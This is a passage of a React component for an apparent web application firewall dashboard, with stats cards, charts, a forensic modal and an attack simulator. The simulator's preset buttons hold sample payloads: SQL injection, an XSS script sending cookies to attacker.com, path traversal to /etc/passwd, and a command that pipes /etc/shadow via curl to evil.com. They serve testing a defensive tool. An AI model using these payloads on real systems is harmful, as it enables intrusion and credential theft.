          <div className="mt-3 pt-3 border-t border-slate-800/80 flex items-center justify-between text-[11px] font-mono">
            <span className="text-slate-500">Audit Trail</span>
            <span className="text-amber-300">Surveillance Mode</span>
          </div>
        </div>

        {/* Attacks Blocked */}
        <div className="p-5 rounded-2xl bg-gradient-to-b from-rose-950/20 via-slate-900/40 to-slate-950/80 border border-rose-500/30 backdrop-blur-md transition-all hover:border-rose-400/60">
          <div className="flex items-start justify-between">
            <div>
              <p className="text-[11px] font-semibold tracking-wider uppercase text-slate-400">Attacks Blocked</p>
              <p className="mt-2 text-3xl font-extrabold font-mono tracking-tight text-rose-300">
                {total_blocked.toLocaleString()}
              </p>
              <p className="mt-1 text-xs text-slate-400 flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-rose-500" />
                Zero-Tolerance 403 Forbidden
              </p>
            </div>
            <div className="p-3 rounded-xl bg-rose-500/15 text-rose-400 border border-rose-500/30">
              <ShieldAlert className="w-5 h-5" />
            </div>
          </div>
          <div className="mt-3 pt-3 border-t border-slate-800/80 flex items-center justify-between text-[11px] font-mono">
            <span className="text-slate-500">Enforcement</span>
            <span className="text-rose-300">Edge Block</span>
          </div>
        </div>
      </div>

      {/* ── 4. ATTACK VECTOR SIMULATOR & PROOF OF PROTECTION ───────────────── */}
      <div className="p-6 rounded-2xl bg-gradient-to-r from-slate-950 via-[#0a1122] to-slate-950 border border-cyan-500/30 shadow-2xl relative overflow-hidden">
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 mb-4 pb-4 border-b border-slate-800">
          <div>
            <div className="flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-cyan-400 animate-ping" />
              <h3 className="text-sm font-bold text-white tracking-wide">
                Live Attack Vector Simulator & Proof of Protection
              </h3>
            </div>
            <p className="text-xs text-slate-400 mt-1">
              Verify how FANOS WAF decodes, normalizes, scores, and blocks exploit payloads targeting fanos-sec.vercel.app.
            </p>
          </div>

          {/* Quick preset buttons */}
          <div className="flex flex-wrap gap-2 text-xs">
            <button
              onClick={() => {
                setSimPayload("admin' OR '1'='1' --");
                handleQuickSimulate("admin' OR '1'='1' --");
              }}
              className="px-2.5 py-1 rounded-lg bg-cyan-950/60 hover:bg-cyan-900/80 text-cyan-300 border border-cyan-800/40 font-mono text-[11px] transition-colors cursor-pointer"
            >
              SQL Injection
            </button>
            <button
              onClick={() => {
                setSimPayload('<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>');
                handleQuickSimulate('<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>');
              }}
              className="px-2.5 py-1 rounded-lg bg-indigo-950/60 hover:bg-indigo-900/80 text-indigo-300 border border-indigo-800/40 font-mono text-[11px] transition-colors cursor-pointer"
            >
              XSS Exploit
            </button>
            <button
              onClick={() => {
                setSimPayload('../../../../etc/passwd');
                handleQuickSimulate('../../../../etc/passwd');
              }}
              className="px-2.5 py-1 rounded-lg bg-amber-950/60 hover:bg-amber-900/80 text-amber-300 border border-amber-800/40 font-mono text-[11px] transition-colors cursor-pointer"
            >
              Path Traversal
            </button>
            <button
              onClick={() => {
                setSimPayload('; cat /etc/shadow | curl -X POST -d @- evil.com');
                handleQuickSimulate('; cat /etc/shadow | curl -X POST -d @- evil.com');
              }}
              className="px-2.5 py-1 rounded-lg bg-rose-950/60 hover:bg-rose-900/80 text-rose-300 border border-rose-800/40 font-mono text-[11px] transition-colors cursor-pointer"
            >
              Remote Command
            </button>
          </div>
        </div>

        {/* Input box */}
        <div className="flex flex-col sm:flex-row gap-3">
          <div className="flex-1 relative">
            <input
              type="text"
              value={simPayload}
              onChange={(e) => setSimPayload(e.target.value)}
              placeholder="Enter synthetic attack payload to test..."
              className="w-full px-4 py-2.5 rounded-xl bg-slate-900/90 border border-slate-700/80 text-white font-mono text-xs focus:outline-none focus:border-cyan-400 transition-colors shadow-inner"
            />
          </div>

          <button
            onClick={() => handleQuickSimulate()}
            disabled={simLoading}
            className="px-5 py-2.5 rounded-xl font-bold text-xs bg-gradient-to-r from-cyan-500 to-sky-500 hover:from-cyan-400 hover:to-sky-400 text-slate-950 flex items-center justify-center gap-2 shadow-lg shadow-cyan-500/25 transition-all shrink-0 cursor-pointer"
          >
            {simLoading ? (
              <RefreshCw className="w-3.5 h-3.5 animate-spin" />
            ) : (
              <Send className="w-3.5 h-3.5" />
            )}
            <span>Dispatch Test Payload</span>
          </button>
        </div>

        {/* Simulation Output Card */}
        {simResult && (
          <div className="mt-4 p-4 rounded-xl bg-slate-900/80 border border-slate-800 text-xs animate-in fade-in slide-in-from-top-2">
            <div className="flex flex-wrap items-center justify-between gap-3 pb-3 border-b border-slate-800">
              <div className="flex items-center gap-3">
                <span className="font-semibold text-slate-400">Verdict:</span>
                <span
                  className={`px-2.5 py-1 rounded-lg font-mono font-bold text-xs uppercase border ${
                    simResult.action === 'block'
                      ? 'bg-rose-500/20 text-rose-300 border-rose-500/40'
                      : simResult.action === 'monitor'
                      ? 'bg-amber-500/20 text-amber-300 border-amber-500/40'
                      : 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                  }`}
                >
                  {simResult.action.toUpperCase()}
                </span>
                <span className="text-slate-400">Risk Score:</span>
                <span
                  className={`font-mono font-bold text-base ${
                    simResult.risk_score >= 70
                      ? 'text-rose-400'
                      : simResult.risk_score >= 30
                      ? 'text-amber-400'
                      : 'text-emerald-400'
                  }`}
                >
                  {simResult.risk_score} / 100
                </span>
              </div>

              <div className="text-[11px] font-mono text-slate-500">
                Inspection Latency: <span className="text-cyan-400">{simResult.execution_time_ms} ms</span>
              </div>
            </div>

            {simResult.matched_rules && simResult.matched_rules.length > 0 && (
              <div className="mt-3">
                <span className="text-[11px] font-semibold text-slate-400 block mb-2">
                  Matched Deterministic Signatures:
                </span>
                <div className="flex flex-wrap gap-2">
                  {simResult.matched_rules.map((rule: any, i: number) => (
                    <span
                      key={i}
                      className="px-2.5 py-1 rounded-lg bg-rose-500/10 border border-rose-500/25 text-rose-300 font-mono text-[11px] flex items-center gap-1.5"
                    >
                      <ShieldAlert className="w-3 h-3 text-rose-400" />
                      {rule.name} (+{rule.risk_score})
                    </span>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}
      </div>

      {/* ── 5. TRAFFIC & THREAT TELEMETRY CHARTS ──────────────────────────────── */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Activity Timeline */}
        <div className="p-5 rounded-2xl bg-gradient-to-b from-slate-900/90 to-slate-950/90 border border-slate-800 shadow-xl">
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Activity className="w-4 h-4 text-cyan-400" />
              Traffic & Threat Ingress Timeline
            </h3>
            <span className="text-[11px] text-slate-500 font-mono px-2 py-0.5 rounded bg-slate-800/60 border border-slate-700/50">
              Live Hourly Feed
            </span>
          </div>

          <div className="h-64">
            {recent_activity_timeline && recent_activity_timeline.length > 0 ? (
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart data={recent_activity_timeline}>
                  <defs>
                    <linearGradient id="colorInspected" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#38BDF8" stopOpacity={0.35} />
                      <stop offset="95%" stopColor="#38BDF8" stopOpacity={0.0} />
                    </linearGradient>
                    <linearGradient id="colorBlocked" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#F43F5E" stopOpacity={0.45} />
                      <stop offset="95%" stopColor="#F43F5E" stopOpacity={0.0} />
                    </linearGradient>
                  </defs>
                  <CartesianGrid strokeDasharray="3 3" stroke="#1E293B" opacity={0.6} />
                  <XAxis dataKey="hour" stroke="#64748B" fontSize={11} tickLine={false} />
                  <YAxis stroke="#64748B" fontSize={11} tickLine={false} />
                  <Tooltip
                    contentStyle={{
                      backgroundColor: '#0A0F1D',
                      borderColor: 'rgba(56, 189, 248, 0.25)',
                      borderRadius: '12px',
                      boxShadow: '0 8px 32px rgba(0,0,0,0.5)',
                    }}
                    itemStyle={{ fontSize: '12px' }}
                  />
                  <Area
                    type="monotone"
                    dataKey="inspected"
                    stroke="#38BDF8"
                    strokeWidth={2}
                    fillOpacity={1}
                    fill="url(#colorInspected)"
                    name="Inspected Requests"
                  />
                  <Area
                    type="monotone"
                    dataKey="blocked"
                    stroke="#F43F5E"
                    strokeWidth={2}
                    fillOpacity={1}
                    fill="url(#colorBlocked)"
                    name="Blocked Attacks"
                  />
                </AreaChart>
              </ResponsiveContainer>
            ) : (
              <div className="flex flex-col items-center justify-center h-full text-slate-500 text-xs font-mono">
                <ShieldCheck className="w-8 h-8 mb-2 stroke-1 text-emerald-500/40" />
                No traffic activity logged yet. Test simulated attacks above to verify telemetry!
              </div>
            )}
          </div>
        </div>

        {/* Top Attack Vectors */}
        <div className="p-5 rounded-2xl bg-gradient-to-b from-slate-900/90 to-slate-950/90 border border-slate-800 shadow-xl">
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Flame className="w-4 h-4 text-rose-400" />
              Top Attack Vector Categories
            </h3>
            <span className="text-[11px] text-slate-500 font-mono px-2 py-0.5 rounded bg-slate-800/60 border border-slate-700/50">
              Matched Signatures
            </span>
          </div>

          <div className="h-64">
            {top_attack_categories && top_attack_categories.length > 0 ? (
              <ResponsiveContainer width="100%" height="100%">
                <BarChart data={top_attack_categories} layout="vertical">
                  <CartesianGrid strokeDasharray="3 3" stroke="#1E293B" horizontal={false} opacity={0.6} />
                  <XAxis type="number" stroke="#64748B" fontSize={11} />
                  <YAxis type="category" dataKey="category" stroke="#94A3B8" fontSize={11} width={135} />
                  <Tooltip
                    contentStyle={{
                      backgroundColor: '#0A0F1D',
                      borderColor: 'rgba(129, 140, 248, 0.25)',
                      borderRadius: '12px',
                      boxShadow: '0 8px 32px rgba(0,0,0,0.5)',
                    }}
                    itemStyle={{ fontSize: '12px' }}
                  />
                  <Bar dataKey="count" fill="#818CF8" radius={[0, 6, 6, 0]} name="Trigger Count" />
                </BarChart>
              </ResponsiveContainer>
            ) : (
              <div className="flex flex-col items-center justify-center h-full text-slate-500 text-xs font-mono">
                <Layers className="w-8 h-8 mb-2 stroke-1 text-slate-600" />
                Zero malicious attack vectors recorded. All incoming payloads clean!
              </div>
            )}
          </div>
        </div>
      </div>

      {/* ── 6. DETAILED EVENT FORENSIC INSPECTION MODAL ───────────────────────── */}
      {selectedInspectEvent && (
        <WAFDetailModal
          isOpen={!!selectedInspectEvent}
          onClose={() => setSelectedInspectEvent(null)}
          title={`Forensic Event Inspection — ${selectedInspectEvent.id || selectedInspectEvent.request_id}`}
        >
          <div className="space-y-4 text-xs font-mono">
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 p-3 rounded-lg bg-slate-900 border border-slate-800">
              <div>
                <span className="text-slate-500 block text-[10px]">VERDICT</span>
                <span
                  className={`font-bold uppercase ${
                    selectedInspectEvent.decision === 'BLOCK' ? 'text-rose-400' : 'text-amber-400'
                  }`}
                >
                  {selectedInspectEvent.decision} (HTTP {selectedInspectEvent.http_status || 403})
                </span>
              </div>
              <div>
                <span className="text-slate-500 block text-[10px]">RISK SCORE</span>
                <span className="text-white font-bold">{selectedInspectEvent.risk_score} / 100</span>
              </div>
              <div>
                <span className="text-slate-500 block text-[10px]">CLIENT IP</span>
                <span className="text-cyan-400">{selectedInspectEvent.client_ip}</span>
              </div>
              <div>
                <span className="text-slate-500 block text-[10px]">TARGET HOST</span>
                <span className="text-slate-200">{selectedInspectEvent.hostname || 'fanos-sec.vercel.app'}</span>
              </div>
            </div>

            <div className="p-3 rounded-lg bg-slate-900 border border-slate-800 space-y-1">
              <span className="text-slate-500 block text-[10px]">REQUEST URI & METHOD</span>
              <div className="text-slate-200">
                <strong className="text-emerald-400 mr-2">{selectedInspectEvent.method}</strong>
                <span>{selectedInspectEvent.path}</span>
              </div>
            </div>

            {selectedInspectEvent.findings && selectedInspectEvent.findings.length > 0 && (
              <div className="space-y-2">
                <span className="text-slate-400 font-bold block text-[11px]">MATCHED RULE FINDINGS</span>
                <div className="space-y-2">
                  {selectedInspectEvent.findings.map((finding: any, idx: number) => (
                    <div key={idx} className="p-3 rounded-lg bg-rose-950/20 border border-rose-500/30">
                      <div className="flex items-center justify-between">
                        <span className="text-rose-300 font-bold">{finding.rule_id || finding.name}</span>
                        <span className="text-rose-400">+{finding.score_addition || finding.risk_score}</span>
                      </div>
                      <p className="text-[11px] text-slate-300 mt-1">{finding.description}</p>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </WAFDetailModal>
      )}
    </div>
  );
};
